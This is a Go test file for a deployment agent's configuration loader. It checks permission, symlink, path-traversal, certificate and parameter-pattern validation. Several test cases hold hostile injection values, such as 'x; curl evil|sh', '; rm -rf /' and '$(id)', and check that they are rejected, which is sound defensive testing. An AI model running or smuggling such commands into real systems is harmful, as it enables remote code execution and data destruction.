//go:build unix

// These tests exercise config.Load against fixtures whose security is
// expressed with POSIX ownership and mode bits. The Windows security model
// (NTFS ACLs, see internal/winsec) is covered by that package's unit tests
// and by config_windows_test.go.
package config

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// writeFixture creates a file at dir/name with the given mode, owned by the
// current test process (which satisfies checkScriptSecurity's "owned by the
// Axiom service account" branch without requiring root).
func writeFixture(t *testing.T, dir, name, content string, mode os.FileMode) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(content), mode); err != nil {
		t.Fatalf("writing fixture %s: %v", p, err)
	}
	if err := os.Chmod(p, mode); err != nil {
		t.Fatalf("chmod fixture %s: %v", p, err)
	}
	return p
}

// testCertPEM/testKeyPEM are a single self-signed certificate/key pair,
// generated once, reused everywhere config_test.go needs "some valid PEM
// certificate/key material" — config.Load validates that files are
// well-formed X.509/PEM, not that ca_file/cert_file/key_file form a
// consistent chain (that deeper check happens at TLS-listener setup).
var testCertPEM, testKeyPEM = generateTestCertPEM()

func generateTestCertPEM() (certPEM, keyPEM string) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		panic(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "axiom-config-test"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		panic(err)
	}
	cert := string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}))
	priv := string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}))
	return cert, priv
}

func baseYAML(dir, scriptPath, caFile, certFile, keyFile string) string {
	return `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443

security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + caFile + `
    cert_file: ` + certFile + `
    key_file: ` + keyFile + `

actions:
  sample.action:
    command: ` + scriptPath + `
    timeout: 5m
    concurrency: exclusive
    parameters:
      image_tag:
        type: string
        pattern: '^[a-zA-Z0-9._-]{1,128}$'
        required: true

authorization:
  identities:
    ci-jenkins:
      actions:
        - sample.action
`
}

func TestLoad_Valid(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\necho hi\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	yamlPath := writeFixture(t, dir, "config.yaml", baseYAML(dir, script, ca, cert, key), 0o640)

	cfg, err := Load(yamlPath)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if cfg.AgentID != "test-agent" {
		t.Errorf("AgentID = %q", cfg.AgentID)
	}
	action, ok := cfg.Actions["sample.action"]
	if !ok {
		t.Fatalf("expected sample.action action")
	}
	if action.Concurrency != ConcurrencyExclusive {
		t.Errorf("Concurrency = %q", action.Concurrency)
	}
	id, ok := cfg.Identities["ci-jenkins"]
	if !ok || !id.IsAllowed("sample.action") {
		t.Errorf("expected ci-jenkins allowed for sample.action")
	}
	if id.IsAllowed("frontend.deploy") {
		t.Errorf("expected ci-jenkins NOT allowed for frontend.deploy (default-deny)")
	}
}

func TestLoad_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := baseYAML(dir, script, ca, cert, key) + "\nnot_a_real_field: true\n"
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)

	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for unknown top-level field")
	}
}

func TestLoad_RejectsRelativeScriptPath(t *testing.T) {
	dir := t.TempDir()
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := baseYAML(dir, "relative-deploy.sh", ca, cert, key)
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)

	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for relative action command path")
	}
}

func TestLoad_RejectsWorldWritableScript(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o757)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	yamlPath := writeFixture(t, dir, "config.yaml", baseYAML(dir, script, ca, cert, key), 0o640)

	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for world-writable action script")
	}
}

func TestLoad_RejectsUnknownActionInIdentity(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + script + `
    timeout: 5m
authorization:
  identities:
    ci-jenkins:
      actions:
        - nonexistent.action
`
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for identity referencing unknown action")
	}
}

func TestLoad_RejectsMissingTimeout(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + script + `
authorization:
  identities: {}
`
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for missing timeout")
	}
}

func TestLoad_RejectsInvalidActionName(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  "bad name!":
    command: ` + script + `
    timeout: 5m
authorization:
  identities: {}
`
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for invalid action name")
	}
}

func TestLoad_RejectsInvalidParameterName(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + script + `
    timeout: 5m
    parameters:
      "1bad-name":
        type: string
authorization:
  identities: {}
`
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for invalid parameter name")
	}
}

func TestLoad_RejectsTimeoutOutOfBounds(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + script + `
    timeout: 48h
authorization:
  identities: {}
`
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for timeout exceeding the maximum bound")
	}
}

func TestLoad_RejectsInvalidCAFile(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", "not a certificate", 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	yamlPath := writeFixture(t, dir, "config.yaml", baseYAML(dir, script, ca, cert, key), 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for invalid CA file content")
	}
}

func TestLoad_RejectsGroupWritableActionDirectory(t *testing.T) {
	dir := t.TempDir()
	actionsDir := filepath.Join(dir, "actions")
	if err := os.Mkdir(actionsDir, 0o775); err != nil { // group-writable, no sticky bit
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.Chmod(actionsDir, 0o775); err != nil { // Mkdir's mode is subject to umask; force it
		t.Fatalf("chmod: %v", err)
	}
	script := writeFixture(t, actionsDir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	yamlPath := writeFixture(t, dir, "config.yaml", baseYAML(dir, script, ca, cert, key), 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for a group-writable (non-sticky) action script directory")
	}
}

func TestLoad_RejectsTooManyParameters(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	var params string
	for i := 0; i < MaxParametersPerAction+1; i++ {
		params += "      p" + string(rune('a'+i%26)) + string(rune('0'+i/26)) + ":\n        type: string\n"
	}
	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + script + `
    timeout: 5m
    parameters:
` + params + `
authorization:
  identities: {}
`
	yamlPath := writeFixture(t, dir, "config.yaml", content, 0o640)
	if _, err := Load(yamlPath); err == nil {
		t.Fatalf("expected error for exceeding the max parameters per action")
	}
}

func TestParameter_PatternIsRequired(t *testing.T) {
	p := Parameter{Type: ParameterTypeString}
	if err := p.Validate("image_tag"); err == nil {
		t.Fatalf("expected an error for a parameter with no pattern")
	}
}

func TestParameter_UnvalidatedParameterRejectsEveryValue(t *testing.T) {
	p := Parameter{Type: ParameterTypeString, Pattern: `.+`}
	if err := p.CheckValue("anything"); err == nil {
		t.Fatalf("a parameter that never passed Validate must not accept values")
	}
}

func TestParameter_PatternMatchesWholeValue(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		value   string
		want    bool
	}{
		{"unanchored rejects embedded match", `[a-z]+`, "x; curl evil|sh", false},
		{"unanchored accepts whole match", `[a-z]+`, "abc", true},
		{"half-anchored alternation rejects suffix", `^a|b$`, "a; rm -rf /", false},
		{"half-anchored alternation accepts a", `^a|b$`, "a", true},
		{"anchored pattern still works", `^[a-z0-9-]+$`, "uat-1", true},
		{"trailing newline rejected", `[a-z]+`, "abc\n", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := Parameter{Type: ParameterTypeString, Pattern: tc.pattern}
			if err := p.Validate("v"); err != nil {
				t.Fatalf("Validate: %v", err)
			}
			if got := p.CheckValue(tc.value) == nil; got != tc.want {
				t.Errorf("CheckValue(%q) accepted = %v, want %v", tc.value, got, tc.want)
			}
		})
	}
}

func TestParameter_CheckValue(t *testing.T) {
	p := Parameter{Type: ParameterTypeString, Pattern: `^[a-z0-9-]+$`}
	if err := p.Validate("image_tag"); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	if err := p.CheckValue("uat-20260823-a81f32c"); err != nil {
		t.Errorf("expected valid value to pass: %v", err)
	}
	if err := p.CheckValue("; rm -rf /"); err == nil {
		t.Errorf("expected shell-metacharacter value to be rejected")
	}
}

func loadWithParameterYAML(t *testing.T, parameterYAML string) error {
	t.Helper()
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + script + `
    timeout: 5m
    parameters:
` + parameterYAML + `
authorization:
  identities: {}
`
	_, err := Load(writeFixture(t, dir, "config.yaml", content, 0o640))
	return err
}

func TestLoad_RejectsParameterWithoutPattern(t *testing.T) {
	err := loadWithParameterYAML(t, "      image_tag:\n        type: string\n        required: true\n")
	if err == nil || !strings.Contains(err.Error(), "pattern is required") {
		t.Fatalf("Load error = %v, want a \"pattern is required\" error", err)
	}
}

func TestLoad_RejectsMalformedParameterPattern(t *testing.T) {
	err := loadWithParameterYAML(t, "      image_tag:\n        type: string\n        pattern: '[a-z'\n")
	if err == nil || !strings.Contains(err.Error(), "invalid pattern") {
		t.Fatalf("Load error = %v, want an \"invalid pattern\" error", err)
	}
}

func TestLoad_AcceptsUnanchoredPatternAndEnforcesFullMatch(t *testing.T) {
	if err := loadWithParameterYAML(t, "      image_tag:\n        type: string\n        pattern: '[a-z]+'\n"); err != nil {
		t.Fatalf("Load: %v", err)
	}
}

func TestParameter_HostileValuesAreRejected(t *testing.T) {
	p := Parameter{Type: ParameterTypeString, Pattern: `[a-z0-9._-]{1,128}`}
	if err := p.Validate("image_tag"); err != nil {
		t.Fatalf("Validate: %v", err)
	}
	hostile := map[string]string{
		"newline":          "abc\ndef",
		"trailing newline": "abc\n",
		"carriage return":  "abc\r",
		"NUL":              "abc\x00def",
		"escape":           "abc\x1b[0m",
		"semicolon":        "a;b",
		"command subst":    "$(id)",
		"backtick":         "`id`",
		"pipe":             "a|b",
		"space":            "a b",
		"unicode":          "caf\u00e9",
		"RTL override":     "abc\u202edef",
		"slash":            "a/b",
		"too long":         strings.Repeat("a", 129),
		"empty":            "",
		"invalid UTF-8":    "a\xffb",
	}
	for name, v := range hostile {
		if err := p.CheckValue(v); err == nil {
			t.Errorf("%s: value %q was accepted", name, v)
		}
	}
	if err := p.CheckValue("uat-20260823-a81f32c"); err != nil {
		t.Errorf("legitimate value rejected: %v", err)
	}
}

func loadWithCommand(t *testing.T, commandFor func(dir, script string) string) error {
	t.Helper()
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)

	content := `
agent:
  id: test-agent
  name: Test Agent
  listen:
    address: 0.0.0.0
    port: 8443
security:
  allow_service_owned_files: true
  mtls:
    ca_file: ` + ca + `
    cert_file: ` + cert + `
    key_file: ` + key + `
actions:
  sample.action:
    command: ` + commandFor(dir, script) + `
    timeout: 5m
authorization:
  identities: {}
`
	_, err := Load(writeFixture(t, dir, "config.yaml", content, 0o640))
	return err
}

func TestLoad_RejectsPathTraversalInCommand(t *testing.T) {
	err := loadWithCommand(t, func(dir, script string) string {
		// Concatenated, not filepath.Join, which would clean the ".." away.
		return dir + "/../" + filepath.Base(dir) + "/deploy.sh"
	})
	if err == nil || !strings.Contains(err.Error(), "clean path") {
		t.Fatalf("Load error = %v, want a clean-path error", err)
	}
}

func TestLoad_RejectsSymlinkedCommand(t *testing.T) {
	err := loadWithCommand(t, func(dir, script string) string {
		link := filepath.Join(dir, "link.sh")
		if err := os.Symlink(script, link); err != nil {
			t.Fatalf("symlink: %v", err)
		}
		return link
	})
	if err == nil || !strings.Contains(err.Error(), "symlink") {
		t.Fatalf("Load error = %v, want a symlink error", err)
	}
}

func TestLoad_RejectsCommandThatIsADirectoryOrMissing(t *testing.T) {
	for name, fn := range map[string]func(dir, script string) string{
		"directory": func(dir, _ string) string { return dir },
		"missing":   func(dir, _ string) string { return filepath.Join(dir, "absent.sh") },
	} {
		if err := loadWithCommand(t, fn); err == nil {
			t.Errorf("%s: Load accepted the command", name)
		}
	}
}

// config.Load refuses a server private key that other users can read, even
// when the development opt-in for service-owned files is set: file mode is
// independent of ownership.
func TestLoad_RejectsWorldReadablePrivateKey(t *testing.T) {
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o644)
	yamlPath := writeFixture(t, dir, "config.yaml", baseYAML(dir, script, ca, cert, key), 0o640)

	_, err := Load(yamlPath)
	if err == nil || !strings.Contains(err.Error(), "key_file") || !strings.Contains(err.Error(), "accessible by other users") {
		t.Fatalf("Load = %v, want a key_file permission error", err)
	}
}

// Without the development opt-in, the documented layout fails for a
// non-root test user because every fixture is service-owned; the error must
// name the problem and the way out instead of failing obscurely.
func TestLoad_StrictModeNamesServiceOwnedFile(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("run as a non-root user")
	}
	dir := t.TempDir()
	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)
	strict := strings.Replace(baseYAML(dir, script, ca, cert, key), "  allow_service_owned_files: true\n", "", 1)
	yamlPath := writeFixture(t, dir, "config.yaml", strict, 0o640)

	_, err := Load(yamlPath)
	if err == nil || !strings.Contains(err.Error(), "root") {
		t.Fatalf("Load = %v, want an ownership error mentioning root", err)
	}
}

func TestLoad_MaxConcurrentBounds(t *testing.T) {
	for _, tc := range []struct {
		value   string
		wantErr bool
	}{{"1", false}, {"1024", false}, {"0", false /* 0 = default */}, {"-1", true}, {"1025", true}} {
		dir := t.TempDir()
		script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
		ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
		cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
		key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)
		content := baseYAML(dir, script, ca, cert, key) + "\njobs:\n  max_concurrent: " + tc.value + "\n"
		cfg, err := Load(writeFixture(t, dir, "config.yaml", content, 0o640))
		if (err != nil) != tc.wantErr {
			t.Errorf("max_concurrent=%s: err = %v, wantErr %v", tc.value, err, tc.wantErr)
		}
		if err == nil && tc.value == "0" && cfg.MaxConcurrentJobs != DefaultMaxConcurrentJobs {
			t.Errorf("default = %d, want %d", cfg.MaxConcurrentJobs, DefaultMaxConcurrentJobs)
		}
	}
}
